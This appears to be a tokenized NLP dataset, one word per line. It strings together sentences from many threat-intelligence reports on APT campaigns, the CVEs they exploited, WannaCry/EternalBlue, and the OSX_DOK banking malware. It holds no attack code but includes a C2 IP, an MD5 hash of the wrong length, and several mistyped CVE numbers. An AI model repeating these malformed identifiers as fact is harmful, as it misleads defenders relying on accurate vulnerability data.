cyber-criminal
gang
that
used
custom
malware
and
APT
techniques
to
steal
millions
of
dollars
while
infecting
hundreds
of
financial
institutions
in
at
least
30
countries
.
 
However
,
in
September
last
year
,
our
friends
at
CSIS
published
a
blog
detailing
a
new
Carbanak
variant
affecting
one
of
its
customers
.
 
In
one
remarkable
case
,
the
Carbanak
2.0
gang
used
its
access
to
a
financial
institution
that
stores
information
about
shareholders
to
change
the
ownership
details
of
a
large
company
.
 
This
Gorgon
Group
campaign
leveraged
spear
phishing
emails
with
Microsoft
Word
documents
exploiting
CVE-2017-0199
.
 
Ke3chang
has
also
leveraged
a
Java
zero-day
vulnerability
(
CVE-2012-4681
)
,
as
well
as
older
,
reliable
exploits
for
Microsoft
Word
(
CVE-2010-3333
)
and
Adobe
PDF
Reader
(
CVE-2010-2883
)
.
 
While
the
URL
acts
similarly
to
how
eye-watch.in
:
443
delivers
payloads
,
we
also
saw
the
URL
leveraging
and
exploiting
security
flaws
in
Flash
:
CVE-2015-8651
,
CVE-2016-1019
,
and
CVE-2016-4117
.
 
The
exploit
,
which
takes
advantage
of
CVE-2018-4878
,
allows
an
attacker
to
execute
arbitrary
code
such
as
an
implant
.
 
Documents
with
the
flash
exploit
managed
to
evade
static
defenses
and
remain
undetected
as
an
exploit
on
VirusTotal
.
 
WannaCry
utilizes
EternalBlue
by
crafting
a
custom
SMB
session
request
with
hard-coded
values
based
on
the
target
system
.
 
WannaCry
leverages
an
exploit
,
codenamed
"
EternalBlue
"
,
that
was
released
by
the
Shadow
Brokers
on
April
14
,
2017
.
 
Microsoft
addressed
the
SMBv1
vulnerabilities
in
March
2017
with
Security
Bulletin
MS17-010
.
 
The
worm
leverages
an
SMBv1
exploit
that
originates
from
tools
released
by
the
Shadow
Brokers
threat
group
in
April
.
 
If
the
DoublePulsar
backdoor
does
not
exist
,
then
the
SMB
worm
attempts
to
compromise
the
target
using
the
Eternalblue
SMBv1
exploit
.
 
Leafminer
has
developed
exploit
payloads
for
this
framework
(
Table
2
)
that
deliver
custom
malware
through
attacks
against
SMB
vulnerabilities
described
by
Microsoft
.
 
The
EternalBlue
exploits
from
the
framework
received
worldwide
attention
after
being
used
in
the
ransomware
campaigns
WannaCry
in
May
and
Petya
/
NotPetya
in
June
2017
.
 
The
Leafminer
operators
use
EternalBlue
to
attempt
lateral
movement
within
target
networks
from
compromised
staging
servers
.
 
Symantec
also
observed
attempts
by
Leafminer
to
scan
for
the
Heartbleed
vulnerability
(
CVE-2014-0160
)
from
an
attacker-controlled
IP
address
.
 
The
attachments
exploited
CVE-2017-8759
which
was
discovered
and
documented
only
five
days
prior
to
the
campaign
.
 
Some
of
the
documents
exploited
CVE-2017-0199
to
deliver
the
payload
.
 
The
group
's
capabilities
are
more
than
the
much
discussed
CVE-2012-0158
exploits
over
the
past
few
years
.
 
Instead
,
the
Spring
Dragon
group
is
known
to
have
employed
spearphish
exploits
,
strategic
web
compromises
,
and
watering
holes
attack
.
 
The
group
's
spearphish
toolset
includes
PDF
exploits
,
Adobe
Flash
Player
exploits
,
and
the
common
CVE-2012-0158
Word
exploits
including
those
generated
from
the
infamous
"
Tran
Duy
Linh
"
kit
.
 
While
this
particular
actor
effectively
used
their
almost
worn
out
CVE-2012-0158
exploits
in
the
past
,
Spring
Dragon
employs
more
involved
and
creative
intrusive
activity
as
well
.
 
To
mitigate
the
threat
of
the
described
campaign
,
security
teams
can
consider
blocking
access
to
the
C2
server
103.236.150.14
and
,
where
applicable
,
ensure
that
the
Microsoft
Security
Update
KB2553204
is
installed
in
order
to
patch
the
CVE-2017-11882
vulnerability
.
 
The
actors
attempted
to
exploit
CVE-2014-6332
using
a
slightly
modified
version
of
the
proof-of-concept
(
POC
)
code
to
install
a
Trojan
called
Emissary
,
which
is
related
to
the
Operation
Lotus
Blossom
campaign
.
 
Both
attachments
are
malicious
Word
documents
that
attempt
to
exploit
the
Windows
OLE
Automation
Array
Remote
Code
Execution
Vulnerability
tracked
by
CVE-2014-6332
.
 
Lotus
Blossom
attempted
to
exploit
CVE-2014-6332
using
the
POC
code
available
in
the
wild
.
 
Lotus
Blossom
was
attempting
to
exploit
CVE-2014-6332
to
install
a
new
version
of
the
Emissary
Trojan
,
specifically
version
5.3
.
 
POWRUNER
was
delivered
using
a
malicious
RTF
file
that
exploited
CVE-2017-0199
.
 
In
November
2017
,
APT34
leveraged
the
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
less
than
a
week
after
Microsoft
issued
a
patch
.
 
PIVY
also
played
a
key
role
in
the
2011
campaign
known
as
Nitro
that
targeted
chemical
makers
,
government
agencies
,
defense
contractors
,
and
human
rights
groups.10,11
Still
active
a
year
later
,
the
Nitro
attackers
used
a
zero-day
vulnerability
in
Java
to
deploy
PIVY
in
2012
.
 
Just
recently
,
PIVY
was
the
payload
of
a
zero-day
exploit
in
Internet
Explorer
used
in
what
is
known
as
a
"
strategic
web
compromise
"
attack
against
visitors
to
a
U.S.
government
website
and
a
variety
of
others
.
 
It
came
in
the
form
of
a
"
Tran
Duy
Linh
"
CVE-2012-0158
exploit
kit
document
MD5
:
de8a242af3794a8be921df0cfa51885f61
and
was
observed
on
April
10
,
2014
.
 
This
bait
document
,
or
email
attachment
,
appears
to
be
a
standard
Word
document
,
but
is
in
fact
an
CVE-2012-0158
exploit
,
an
executable
with
a
double
extension
,
or
an
executable
with
an
RTLO
filename
,
so
it
can
execute
code
without
the
user
's
knowledge
or
consent
.
 
PROMETHIUM
and
NEODYMIUM
both
used
an
exploit
for
CVE-2016-4117
,
a
vulnerability
in
Adobe
Flash
Player
that
,
at
the
time
,
was
both
unknown
and
unpatched
.
 
PROMETHIUM
and
NEODYMIUM
both
used
a
zero-day
exploit
that
executed
code
to
download
a
malicious
payload
.
 
NEODYMIUM
also
used
the
exact
same
CVE-2016-4117
exploit
code
that
PROMETHIUM
used
,
prior
to
public
knowledge
of
the
vulnerability
's
existence
.
 
In
May
2016
,
two
apparently
unrelated
activity
groups
,
PROMETHIUM
and
NEODYMIUM
,
conducted
attack
campaigns
in
Europe
that
used
the
same
zeroday
exploit
while
the
vulnerability
was
publicly
unknown
.
 
The
Middle
Eastern
hacker
group
in
this
case
is
codenamed
"
BlackOasis
"
Kaspersky
found
the
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
The
discovery
by
Kaspersky
marks
at
least
the
fifth
zero-day
exploit
used
by
BlackOasis
and
exposed
by
security
researchers
since
June
2015
.
 
Less
than
a
week
after
Microsoft
issued
a
patch
for
CVE-2017-11882
on
Nov.
14
,
2017
,
FireEye
observed
an
attacker
using
an
exploit
for
the
Microsoft
Office
vulnerability
to
target
a
government
organization
in
the
Middle
East
.
 
The
backdoor
was
delivered
via
a
malicious
.rtf
file
that
exploited
CVE-2017-0199
.
 
In
this
latest
campaign
,
APT34
leveraged
the
recent
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
.
 
During
the
past
few
months
,
APT34
has
been
able
to
quickly
incorporate
exploits
for
at
least
two
publicly
vulnerabilities
(
CVE-2017-0199
and
CVE-2017-11882
)
to
target
organizations
in
the
Middle
East
.
 
In
November
2017
,
APT34
leveraged
the
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
less
than
a
week
after
Microsoft
issued
a
patch
.
 
POWRUNER
was
delivered
using
a
malicious
RTF
file
that
exploited
CVE-2017-0199
.
 
Specifically
,
Suckfly
used
a
specially
crafted
web
page
to
deliver
an
exploit
for
the
Microsoft
Windows
OLE
Remote
Code
Execution
Vulnerability
(
CVE-2014-6332
)
,
which
affects
specific
versions
of
Microsoft
Windows
.
 
This
time
,
however
,
TA459
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
This
time
,
however
,
attackers
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
Data
from
the
early
part
of
this
year
shows
that
the
Taidoor
attackers
rampantly
used
malicious.DOC
files
to
exploit
a
Microsoft
Common
Controls
vulnerability
,
CVE-2012-0158
.
 
TG-3390
uses
older
exploits
to
compromise
targets
,
and
CTU
researchers
have
not
observed
the
threat
actors
using
zero-day
exploits
as
of
this
publication
.
 
TG-3390
actors
have
used
Java
exploits
in
their
SWCs
.
 
In
particular
,
TG-3390
has
exploited
CVE-2011-3544
,
a
vulnerability
in
the
Java
Runtime
Environment
,
to
deliver
the
HTTPBrowser
backdoor
;
and
CVE-2010-0738
,
a
vulnerability
in
JBoss
,
to
compromise
internally
and
externally
accessible
assets
used
to
redirect
users'
web
browsers
to
exploit
code
.
 
In
particular
,
the
threat
actors
have
exploited
CVE-2011-3544
,
a
vulnerability
in
the
Java
Runtime
Environment
,
to
deliver
the
HTTPBrowser
backdoor
;
and
CVE-2010-0738
,
a
vulnerability
in
JBoss
,
to
compromise
internally
and
externally
accessible
assets
used
to
redirect
users'
web
browsers
to
exploit
code
.
 
TG-3390
's
activities
indicate
a
preference
for
leveraging
SWCs
and
scan-and-exploit
techniques
to
compromise
target
systems
.
 
Even
when
we
observed
LuckyMouse
using
weaponized
documents
with
CVE-2017-11882
(
Microsoft
Office
Equation
Editor
,
widely
used
by
Chinese-speaking
actors
since
December
2017
)
,
we
cant
prove
they
were
related
to
this
particular
attack
.
 
LuckyMouse
has
been
spotted
using
a
widely
used
Microsoft
Office
vulnerability
(
CVE-2017-11882
)
.
 
No
zero-day
vulnerabilities
were
used
to
breach
targeted
networks
,
instead
"
TG-3390
relied
on
old
vulnerabilities
such
as
CVE-2011-3544
"
a
near-year-old
Java
security
hole
"
and
CVE-2010-0738
to
compromise
their
targets
"
,
Dell
SecureWorks'
researchers
reported
.
 
Execute
a
command
through
exploits
for
CVE-2017-11882
.
 
Execute
a
command
through
exploits
for
CVE-2018-0802
.
 
The
document
attached
to
this
e-mail
exploits
CVE-2012-0158
.
 
Tropic
Trooper
is
also
still
exploiting
CVE-2012-0158
,
as
are
many
threat
actors
.
 
The
documents
attached
to
spear-phishing
e-mails
used
in
both
attacks
contain
code
that
exploits
CVE-2012-0158
,
which
despite
its
age
remains
one
of
the
most
common
Microsoft
Word
vulnerabilities
being
exploited
by
multiple
threat
actors
.
 
the
backdoor
is
packaged
together
with
the
CVE-2013-5065
EoP
exploit
and
heavily
obfuscated
.
 
While
we
were
unable
to
recover
the
initial
vulnerability
used
,
it
is
possibly
the
same
CVE-2014-0515
Adobe
Flash
exploit
first
reported
by
Cisco
TRAC
in
late
July
.
 
However
,
to
increase
success
rates
APT20
can
use
zero-day
exploits
,
so
even
a
properly
patched
system
would
be
compromised
.
 
PLEAD
also
dabbled
with
a
short-lived
,
fileless
version
of
their
malware
when
it
obtained
an
exploit
for
a
Flash
vulnerability
(
CVE-2015-5119
)
that
was
leaked
during
the
Hacking
Team
breach
.
 
PLEAD
also
uses
CVE-2017-7269
,
a
buffer
overflow
vulnerability
Microsoft
Internet
Information
Services
(
IIS
)
6.0
to
compromise
the
victim
's
server
.
 
Kaspersky
Lab
has
detected
a
new
method
of
first
infection
that
uses
a
drive-by-download
with
a
flash
exploit
(
CVE-2015-5119
,
the
one
leaked
from
The
Hacking
Team
incident
)
.
 
If
the
document
was
delivered
with
macros
instead
of
exploits
(
CVE-2012-0158
,
CVE-2013-3906
or
CVE-2014-1761
)
,
then
the
document
contained
instructions
for
enabling
macros
.
 
Moreover
,
they
used
the
same
exploit
kit
Niteris
as
that
in
the
Corkow
case
.
 
The
CVE-2012-0773
was
originally
discovered
by
VUPEN
and
has
an
interesting
story
.
 
The
decoy
documents
used
by
the
InPage
exploits
suggest
that
the
targets
are
likely
to
be
politically
or
militarily
motivated
.
 
While
documents
designed
to
exploit
the
InPage
software
are
rare
,
they
are
not
new
however
in
recent
weeks
Unit42
has
observed
numerous
InPage
exploits
leveraging
similar
shellcode
,
suggesting
continued
use
of
the
exploit
previously
discussed
by
Kaspersky
.
 
Compared
to
Patchwork
,
whose
Trojanized
documents
exploit
at
least
five
security
flaws
,
Confucius'
backdoors
are
delivered
through
Office
files
exploiting
memory
corruption
vulnerabilities
CVE-2015-1641
and
CVE-2017-11882
.
 
Lately
,
Patchwork
has
been
sending
multiple
RTF
files
exploiting
CVE-2017-8570
.
 
Confucius'
backdoors
are
delivered
through
Office
documents
exploiting
memory
corruption
vulnerabilities
CVE-2015-1641
and
CVE-2017-11882
.
 
The
sctrls
backdoor
we
came
across
is
delivered
via
RTF
files
exploiting
CVE-2015-1641
.
 
The
documents
that
exploit
CVE-2017-11882
download
another
payload
an
HTML
Application
(
HTA
)
file
toting
a
malicious
Visual
Basic
(
VBS
)
script
from
the
server
,
which
is
executed
accordingly
by
the
command-line
tool
mshta.exe
.
 
Hackers
use
the
exploits
"
Nitris
Exploit
Kit
"
(
earlier
known
as
CottonCastle
)
,
which
is
not
available
in
open
sources
and
sold
only
to
trusted
users
.
 
Hackers
first
actively
spread
bots
using
the
Niteris
exploit
,
and
then
search
for
infected
devices
at
banks
amongst
their
bots
by
analyzing
IP
addresses
,
cracked
passwords
and
results
of
the
modules
performance
.
 
In
August
2014
,
some
of
our
users
observed
targeted
attacks
with
a
variation
of
CVE-2012-0158
and
an
unusual
set
of
malware
.
 
Longhorn
,
which
we
internally
refer
to
as
"
The
Lamberts
"
,
first
came
to
the
attention
of
the
ITSec
community
in
2014
,
when
our
colleagues
from
FireEye
discovered
an
attack
using
a
zero
day
vulnerability
(
CVE-2014-4148
)
.
 
The
first
time
the
Lambert
family
malware
was
uncovered
publicly
was
in
October
2014
,
when
FireEye
posted
a
blog
about
a
zero
day
exploit
(
CVE-2014-4148
)
used
in
the
wild
.
 
While
in
most
cases
the
infection
vector
remains
unknown
,
the
high
profile
attack
from
2014
used
a
very
complex
Windows
TTF
zero-day
exploit
(
CVE-2014-4148
)
.
 
To
further
exemplify
the
proficiency
of
the
attackers
leveraging
the
Lamberts
toolkit
,
deployment
of
Black
Lambert
included
a
rather
sophisticated
TTF
zero
day
exploit
,
CVE-2014-4148
.
 
This
sample
was
also
found
to
be
deployed
using
the
CVE-2012-0158
vulnerability
.
 
Our
analysis
shows
that
actors
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
Unit
42
's
analysis
shows
that
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
Our
analysis
shows
that
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
NetTraveler
Trojan
.
 
In
this
report
,
we'll
review
how
the
actors
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
In
this
report
,
we'll
review
how
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
In
this
report
,
we'll
review
how
the
NetTraveler
attempted
to
exploit
CVE-2012-0158
to
install
the
NetTraveler
Trojan
.
 
Kaspersky
Lab
's
products
detect
the
Microsoft
Office
exploits
used
in
the
spear-phishing
attacks
,
including
Exploit.MSWord.CVE-2010-333
,
Exploit.Win32.CVE-2012-0158
.
 
The
files
exploit
the
well-known
Microsoft
Office
vulnerability
,
CVE-2012-0158
,
to
execute
malicious
code
in
order
to
take
control
of
the
targeted
systems
.
 
Earlier
this
month
,
Securelist
's
technology
caught
another
zero-day
exploits
deployed
in
targeted
attacks
.
 
Operation
Daybreak
appears
to
have
been
launched
by
ScarCruft
in
March
2016
and
employs
a
previously
unknown
(
0-day
)
Adobe
Flash
Player
exploit
.
 
Adobe
Flash
Player
exploit
.
 
It
is
also
possible
that
ScarCruft
deployed
another
zero
day
exploit
,
CVE-2016-0147
,
which
was
patched
in
April
.
 
Operation
Erebus
leverages
another
Flash
Player
exploit
(
CVE-2016-4117
)
through
the
use
of
watering
hole
attacks
.
 
ScarCruft
's
Operation
Erebus
leverages
another
Flash
Player
exploit
(
CVE-2016-4117
)
through
the
use
of
watering
hole
attacks
.
 
Nevertheless
,
resourceful
threat
actors
such
as
ScarCruft
will
probably
continue
to
deploy
zero-day
exploits
against
their
high
profile
targets
.
 
This
malware
uses
the
public
privilege
escalation
exploit
code
CVE-2018-8120
or
UACME
which
is
normally
used
by
legitimate
red
teams
.
 
Earlier
this
month
,
we
caught
another
zero-day
Adobe
Flash
Player
exploits
deployed
in
targeted
attacks
.
 
The
other
one
,
ScarCruft
's
Operation
Erebus
employs
an
older
exploit
,
for
CVE-2016-4117
and
leverages
watering
holes
.
 
The
other
one
,
"
Operation
Erebus
"
employs
an
older
exploit
,
for
CVE-2016-4117
and
leverages
watering
holes
.
 
The
ScarCruft
APT
gang
has
made
use
of
a
Flash
zero
day
patched
Thursday
by
Adobe
to
attack
more
than
two
dozen
high-profile
targets
in
Russia
and
Asia
primarily
.
 
Adobe
on
Thursday
patched
a
zero-day
vulnerability
in
Flash
Player
that
has
been
used
in
targeted
attacks
carried
out
by
a
new
APT
group
operating
primarily
against
high-profile
victims
in
Russia
and
Asia
.
 
Researchers
at
Kaspersky
Lab
privately
disclosed
the
flaw
to
Adobe
after
exploits
against
the
zero-day
were
used
in
March
by
the
ScarCruft
APT
gang
in
what
Kaspersky
Lab
is
calling
Operation
Daybreak
.
 
Kaspersky
speculates
that
ScarCruft
could
also
be
behind
another
zero-day
,
CVE-2016-0147
,
a
vulnerability
in
Microsoft
XML
Core
Services
that
was
patched
in
April
.
 
Another
set
of
attacks
called
Operation
Erebus
leverages
another
flash
exploit
,
CVE-2016-4117
,
and
relies
on
watering
hole
attacks
as
a
means
of
propagation
.
 
Thursday
's
Flash
Player
update
patched
36
vulnerabilities
in
total
including
the
zero
day
CVE-2016-4171
.
 
Wild
Neutron
's
attacks
in
2015
uses
a
stolen
code
signing
certificate
belonging
to
Taiwanese
electronics
maker
Acer
and
an
unknown
Flash
Player
exploit
.
 
Wild
Neutron
's
attack
took
advantage
of
a
Java
zero-day
exploit
and
used
hacked
forums
as
watering
holes
.
 
Instead
of
Flash
exploits
,
older
Wild
Neutron
exploitation
and
watering
holes
used
what
was
a
Java
zero-day
at
the
end
of
2012
and
the
beginning
of
2013
,
detected
by
Kaspersky
Lab
products
as
Exploit.Java.CVE-2012-3213.b
.
 
In
that
case
,
we
observed
Buhtrap
using
a
local
privilege
escalation
exploit
,
CVE-2019-1132
,
against
one
of
its
victims
.
 
Prior
to
that
report
,
we
published
detail
analysis
on
malware
exploiting
CVE-2018-8414
vulnerability
(remote
code
execution
in
SettingContent-ms)
,
which
is
believed
a
work
of
DarkHydrus
.
 
WannaCry
incorporated
the
leaked
EternalBlue
exploit
that
used
two
known
vulnerabilities
in
Windows
CVE-2017-0144
and
CVE-2017-0145
to
turn
the
ransomware
into
a
worm
,
capable
of
spreading
itself
to
any
unpatched
computers
on
the
victim's
network
and
also
to
other
vulnerable
computers
connected
to
the
internet
.
 
One
vulnerability
is
a
Windows
zero-day
vulnerability
(
CVE-2019-0703
)
discovered
by
Symantec
.
 
Bemstour
exploits
two
Windows
vulnerabilities
in
order
to
achieve
remote
kernel
code
execution
on
targeted
computers
.
 
The
second
Windows
vulnerability
(
CVE-2017-0143
)
was
patched
in
March
2017
after
it
was
discovered
to
have
been
used
by
two
exploit
toolsEternalRomance
and
EternalSynergythat
were
also
released
as
part
of
the
Shadow
Brokers
leak
.
 
These
include
CVE-2010-3962
as
part
of
an
attack
campaign
in
2010
and
CVE-2014-1776
in
2014
.
 
Beginning
in
August
2016
,
a
group
calling
itself
the
Shadow
Brokers
began
releasing
tools
it
claimed
to
have
originated
from
the
Equation
Group
.
 
The
zero-day
vulnerability
found
and
reported
by
Symantec
CVE-2019-0703
occurs
due
to
the
ACT
the
Windows
SMB
Server
handles
certain
requests
.
 
CVE-2017-0143
was
also
used
by
two
other
exploit
toolsEternalRomance
and
EternalSynergythat
were
released
as
part
of
the
Shadow
Brokers
leak
in
April
2017
.
 
this
RTF
exploits
again
the
CVE-2017-1882
on
eqnedt32.exe
.
 
At
this
time
,
we
do
not
believe
that
the
attackers
found
a
new
ASA
exploit
.
 
We
believe
the
groups
moved
to
use
CVE-2018-0798
instead
of
the
other
Microsoft
Equation
Editor
Remote
Code
Execution
(
RCE
)
vulnerabilities
because
the
former
is
more
reliable
as
it
works
on
all
known
versions
of
Equation
Editor
.
 
The
analyzed
RTF
files
share
the
same
object
dimension
(objw2180\objh300)
used
to
track
the
RTF
weaponizer
in
our
previous
report
,
however
,
the
sample
was
not
exploiting
CVE-2017-11882
or
CVE-2018-0802
.
 
After
further
analysis
,
it
was
discovered
that
the
RTF
files
were
exploiting
the
CVE-2018-0798
vulnerability
in
Microsoft
s
Equation
Editor
(
EQNEDT32
)
.
 
Anomali
Researchers
were
able
to
identify
multiple
samples
of
malicious
RTF
documents
ITW
using
the
same
exploit
for
CVE-2018-0798
.
 
CVE-2018-0798
is
an
RCE
vulnerability
,
a
stack
buffer
overflow
that
can
be
exploited
by
a
threat
actor
to
perform
stack
corruption
.
 
As
observed
previously
with
CVE-2017-11882
and
CVE-2018-0802
,
the
weaponizer
was
used
exclusively
by
Chinese
Cyber
Espionage
actors
for
approximately
one
year
December
2017
through
December
2018
,
after
which
cybercrime
actors
began
to
incorporate
it
in
their
malicious
activity
.
 
Analysis
of
the
Royal
Road
weaponizer
has
resulted
in
the
discovery
that
multiple
Chinese
threat
groups
started
utilizing
CVE-2018-0798
in
their
RTF
weaponizer
.
 
These
findings
also
suggest
that
the
threat
groups
have
robust
exploit
developing
capabilities
because
CVE-2018-0798
is
not
widely
reported
on
and
it
is
typically
not
incorporated
into
publicly
available
weaponizers
.
 
Upon
opening
of
the
MS
Word
document
,
our
embedded
file
exploits
CVE-2017-11882
to
drop
a
malicious
fake
Norton
Security
Shell
Extension
module
,
'NavShExt.dll'
,
which
is
then
injected
into
iexplore.exe
to
install
the
backdoor
,
begin
collection
,
and
activate
command
and
control
.
 
Moving
through
the
infection
process
,
NetWitness
Endpoint
detects
the
initial
exploit
CVE-2017-1182
in
action
as
the
Microsoft
Equation
Editor
,
'EQNEDT32.exe'
,
scores
high
for
potentially
malicious
activity
.
 
Attackers
relied
on
Microsoft
Equation
Editor
exploit
CVE-2018-0798
to
deliver
a
custom
malware
that
Proofpoint
researchers
have
dubbed
Cotx
RAT.
Maudi
Surveillance
Operation
which
was
previously
reported
in
2013
.
 
specifically
CVE-2018-0798
,
before
downloading
subsequent
payloads
.
 
Dubbed
Operation
Sheep
,
this
massive
data
stealing
campaign
is
the
first
known
campaign
seen
in
the
wild
to
exploit
the
Man-in-the-Disk
vulnerability
revealed
by
Check
Point
Research
earlier
last
year
.
 
Notably
,
APT41
was
observed
using
proof-of-concept
exploit
code
for
CVE-2019-3396
within
23
days
after
the
Confluence
.
 
Weve
discovered
a
new
version
of
BalkanDoor
with
a
new
method
for
execution/installation:
an
exploit
of
the
WinRAR
ACE
vulnerability
CVE-2018-20250
.
 
In
some
of
the
latest
samples
of
BalkanDoor
detected
in
2019
,
the
malware
is
distributed
as
an
ACE
archive
,
disguised
as
a
RAR
archive
(i.e.
,
not
an
executable
file)
,
specially
crafted
to
exploit
the
WinRAR
ACE
vulnerability
CVE-2018-20250
.
 
The
actor
attempts
to
exploit
CVE-20188440
an
elevation
of
privilege
vulnerability
in
Windows
when
it
improperly
handles
calls
to
Advanced
Local
Procedure
Call
to
elevate
the
privileges
using
a
modified
proof-of-concept
exploit
.
 
The
China
Chopper
actor
activity
starts
with
the
download
and
execution
of
two
exploit
files
which
attempt
to
exploit
the
Windows
vulnerabilities
CVE-2015-0062
,
CVE-2015-1701
and
CVE-2016-0099
to
allow
the
attacker
to
modify
other
objects
on
the
server
.
 
Previously
,
Cloud
Atlas
dropped
its
validator
implant
named
PowerShower
directly
,
after
exploiting
the
Microsoft
Equation
vulnerability
CVE-2017-11882
mixed
with
CVE-2018-0802
.
 
The
following
archive
caught
our
attention
for
exploiting
a
WinRAR
unacev2
module
vulnerability
and
for
having
interesting
content
.
 
Mimikatz
is
a
post-exploitation
tool
that
allows
attackers
to
extract
credentials
from
volatile
memory
.
 
Analysis
of
the
emails
has
shown
that
the
attachment
contains
an
exploit
for
the
CVE-2017-11882
vulnerability
.
 
The
exploit
installs
Silences
loader
,
designed
to
download
backdoors
and
other
malicious
programs
.
 
We
believe
Emissary
Panda
exploited
a
recently
patched
vulnerability
in
Microsoft
SharePoint
tracked
by
CVE-2019-0604
,
which
is
a
remote
code
execution
vulnerability
used
to
compromise
the
server
and
eventually
install
a
webshell
.
 
Of
particular
note
is
their
use
of
tools
to
identify
systems
vulnerable
to
CVE-2017-0144
,
which
is
the
same
vulnerability
exploited
by
EternalBlue
that
is
best
known
for
its
use
in
the
WannaCry
attacks
of
2017
.
 
In
addition
to
the
aforementioned
post-exploitation
tools
,
the
actors
used
these
webshells
to
upload
legitimate
executables
that
they
would
use
DLL
sideloading
to
run
a
malicious
DLL
that
has
code
overlaps
with
known
Emissary
Panda
attacks
.
 
OSX
Malware
Linked
to
Operation
Emmental
Hijacks
User
Network
Traffic
.
 
The
OSX_DOK
malware
(
Detected
by
Trend
Micro
as
OSX_DOK.C
)
showcases
sophisticated
features
such
as
certificate
abuse
and
security
software
evasion
that
affects
machines
using
Apple
s
OS
X
operating
system
.
 
This
malware
,
which
specifically
targets
Swiss
banking
users
,
uses
a
phishing
campaign
to
drop
its
payload
,
which
eventually
results
in
the
hijacking
of
a
user
s
network
traffic
using
a
Man-in-the-Middle
(
MitM
)
attack
.
 
OSX_DOK.C
seems
to
be
another
version
of
WERDLOD
(
Detected
by
Trend
Micro
as
TROJ_WERDLOD
Family
)
,
which
is
a
malware
that
was
used
during
the
Operation
Emmental
campaignsan
interesting
development
that
we
will
tackle
further
in
this
blog
post
.
 
OSX_DOK.C
first
arrives
via
a
phishing
email
that
contains
certain
files
labeled
as
either
.zip
or
.docx
files
.
 
The
sample
we
analyzed
was
a
purported
message
from
a
police
inspector
in
Zurich
allegedly
claiming
to
unsuccessfully
contact
the
recipient
.
 
The
email
also
comes
with
two
files
attached
claiming
to
contain
questions
for
the
user
:
one
is
a
.zip
file
,
which
is
a
fake
OS
X
app
,
while
the
other
is
a
.docx
file
used
to
target
Windows
operating
systems
using
WERDLOD
.
 
Both
of
these
samples
work
as
Banking
Trojans
and
provide
similar
functionalities
.
 
Some
examples
of
the
files
used
in
the
email
attachment
include
the
following
:
Zahlungsinformationen
01.06.2017.zip
.
 
Zahlungsinformationen
digitec.zip
.
 
Dokument
09.06.2017.zip
.
 
Dokument
09.06.2017.docx
.
 
06.2017.docx
.
 
Once
the
docx
file
included
in
the
phishing
email
is
clicked
,
a
warning
window
will
pop
up
.
 
After
this
,
the
App
Store
on
the
system
will
be
removed
,
followed
by
a
full
screen
fake
OS
X
update
screen
.
 
It
will
ask
for
a
password
to
run
command
as
root
.
 
The
malware
will
begin
to
download
other
utilities
.
 
It
relies
on
Homebrew
,
an
open
source
software
package
manager
to
install
Golang
and
Tor
.
 
The
malware
will
then
install
fake
certificates
in
the
system
to
perform
a
MitM
attack
without
notifying
the
user
.
 
The
structure
of
the
fake
App
Store
matches
the
application
bundle
structure
and
provides
both
English
and
German
interfaces
.
 
The
archive
in
Mac
OS
X
looks
like
this
:
Mac
OS
X
will
run
the
application
if
it
passes
certificates
.
 
In
this
case
,
the
malware
is
signed
off
by
a
developer
,
which
may
actually
be
a
dummy
account
or
that
of
a
compromised
user
.
 
In
addition
,
the
time
stamp
on
the
CA
is
new
,
which
might
mean
that
it
was
obtained
specifically
for
this
attack
.
 
The
fake
certificate
imitates
the
COMODO
root
certificate
.
 
Take
note
that
the
fake
certificate
does
not
contain
a
COMODO
Certificate
Authority
seal
that
certifies
its
validity
,
as
seen
in
the
comparison
below
:
We
noticed
that
this
malware
will
not
work
for
Mozilla
Firefox
or
Google
Chrome
since
these
two
browsers
have
their
own
root
certificates
.
 
Of
all
the
major
browsers
,
only
Safari
uses
the
system
s
certificates
.
 
We
observed
the
attacker
targeting
both
Windows
and
Mac
OS
X
in
the
same
spam
mail
on
June
9
,
2017
.
 
There
is
a
file
shortcut
embedded
in
the
malicious
.docx
fileone
that
will
download
an
executable
file
from
Dropbox
that
executes
once
clicked
by
the
user
.
 
The
functionalities
are
similar
to
the
malicious
app
provided
,
which
includes
installing
tor
and
proxy
.
 
We
have
already
notified
Dropbox
about
the
use
of
its
service
for
this
malware
.
 
Dropbox
has
already
taken
down
the
links
.
 
The
malware
will
install
two
proxies
running
on
local
host
port
5555
and
5588
.
 
All
of
the
traffic
will
be
hijacked
into
the
first
proxy
(
port
5555
)
with
the
victim
s
external
IP
address
as
parameter
.
 
The
first
(
port
5555
)
proxy
first
finds
the
IP
parameter
.
 
If
it
is
not
in
Switzerland
,
the
traffic
will
proceed
as
normal
.
 
If
it
detects
an
IP
located
in
Switzerland
,
the
malware
will
run
an
obfuscated
JavaScript
code
and
find
its
visiting
domain
.
 
If
the
domain
is
in
the
target
,
the
malware
will
perform
a
MitM
attack
and
redirect
the
traffic
to
the
second
proxy
(
port
5588
)
,
which
routes
the
traffic
to
the
Tor
network
.
 
The
purpose
of
these
steps
is
to
target
users
in
Switzerland
and
hijack
their
traffic
After
deobfuscating
the
malware
,
we
found
the
target
domains
:
The
target
domain
s
visitors
will
be
redirected
into
an
e-banking
login
page
that
looks
and
acts
normally
,
but
is
located
on
dark
web
sites
